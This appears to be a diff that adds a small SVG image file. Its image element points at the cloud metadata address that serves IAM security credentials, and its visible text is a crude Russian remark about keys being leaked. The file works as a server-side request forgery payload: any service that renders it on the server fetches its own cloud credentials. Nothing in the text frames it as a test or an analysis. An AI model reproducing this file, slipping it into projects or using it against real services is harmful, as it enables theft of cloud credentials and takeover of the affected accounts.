@@ -1,0 +1,9 @@
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
+"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg width="300" height="300" xmlns="http://www.w3.org/2000/svg">
+  <image href="http://169.254.169.254/latest/meta-data/iam/security-credentials/" x="0" y="0" width="200" height="200" />
+  <text x="0" y="20" font-family="Verdana" font-size="10">
+    бля, спалили ключи
+  </text>
+</svg>
